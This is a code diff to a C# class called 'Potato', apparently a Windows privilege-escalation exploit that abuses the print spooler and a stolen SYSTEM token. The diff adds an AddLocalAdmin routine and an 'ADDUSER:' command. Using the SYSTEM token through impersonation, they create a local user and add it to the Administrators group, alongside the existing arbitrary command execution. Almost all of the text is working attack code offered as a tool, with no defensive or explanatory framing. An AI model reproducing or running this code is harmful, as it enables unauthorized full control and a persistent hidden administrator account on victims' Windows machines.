@@ -71,6 +71,13 @@ public class Potato
     [DllImport("ntdll.dll")]
     static extern uint NtDuplicateObject(IntPtr src, IntPtr srcH, IntPtr tgt, out IntPtr tgtH, uint da, uint attr, uint opt);
 
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    static extern int NetUserAdd(string server, int level, IntPtr buf, out int parmErr);
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    static extern int NetLocalGroupAddMembers(string server, string group, int level, IntPtr buf, int count);
+    [DllImport("netapi32.dll")]
+    static extern int NetApiBufferFree(IntPtr buf);
+
     [DllImport("winspool.drv", CharSet = CharSet.Unicode, SetLastError = true)]
     static extern bool OpenPrinterW(string n, out IntPtr h, IntPtr d);
     [DllImport("winspool.drv")]
@@ -718,6 +725,50 @@ public class Potato
         return _got;
     }
 
+    static string AddLocalAdmin(string user, string pass)
+    {
+        IntPtr impToken;
+        DuplicateTokenEx(_sysToken, 0xF01FF, IntPtr.Zero, 2, 2, out impToken);
+        ImpersonateLoggedOnUser(impToken);
+
+        int ptrSize = IntPtr.Size;
+        IntPtr ui = Marshal.AllocHGlobal(ptrSize * 8);
+        for (int i = 0; i < ptrSize * 8; i++) Marshal.WriteByte(ui, i, 0);
+        Marshal.WriteIntPtr(ui, 0, Marshal.StringToHGlobalUni(user));
+        Marshal.WriteIntPtr(ui, ptrSize, Marshal.StringToHGlobalUni(pass));
+        Marshal.WriteInt32(ui, ptrSize * 2, 0);
+        Marshal.WriteInt32(ui, ptrSize * 2 + 4, 1);
+        Marshal.WriteInt32(ui, 4 * ptrSize + 8, 0x10201);
+
+        int parmErr;
+        int ret = NetUserAdd(null, 1, ui, out parmErr);
+        Marshal.FreeHGlobal(Marshal.ReadIntPtr(ui, 0));
+        Marshal.FreeHGlobal(Marshal.ReadIntPtr(ui, ptrSize));
+        Marshal.FreeHGlobal(ui);
+
+        if (ret != 0 && ret != 2224)
+        {
+            RevertToSelf(); CloseHandle(impToken);
+            if (ret == 2245) return "ERR:PASSWORD_POLICY";
+            return "ERR:NetUserAdd=" + ret;
+        }
+        bool existed = (ret == 2224);
+
+        IntPtr mi = Marshal.AllocHGlobal(ptrSize);
+        Marshal.WriteIntPtr(mi, 0, Marshal.StringToHGlobalUni(user));
+        ret = NetLocalGroupAddMembers(null, "Administrators", 3, mi, 1);
+        Marshal.FreeHGlobal(Marshal.ReadIntPtr(mi, 0));
+        Marshal.FreeHGlobal(mi);
+
+        RevertToSelf(); CloseHandle(impToken);
+
+        if (ret != 0 && ret != 1378)
+            return "ERR:NetLocalGroupAddMembers=" + ret;
+
+        if (existed) return "Local admin updated: " + user;
+        return "Local admin created: " + user;
+    }
+
     static string Exec(string cmd)
     {
         if (_sysToken == IntPtr.Zero) return "ERR:NO_TOKEN";
@@ -799,7 +850,16 @@ public class Potato
                     + "|" + diag + "|pipe:" + _pipeDiag + "|direct:" + _lastDiag;
             }
 
-            string result = Exec(cmd);
+            string result;
+            if (cmd.StartsWith("ADDUSER:"))
+            {
+                string[] parts = cmd.Substring(8).Split(new char[] { ':' }, 2);
+                result = AddLocalAdmin(parts[0], parts.Length > 1 ? parts[1] : "");
+            }
+            else
+            {
+                result = Exec(cmd);
+            }
             if (_sysToken != IntPtr.Zero) { CloseHandle(_sysToken); _sysToken = IntPtr.Zero; }
             return "[" + used + "] " + result;
         }
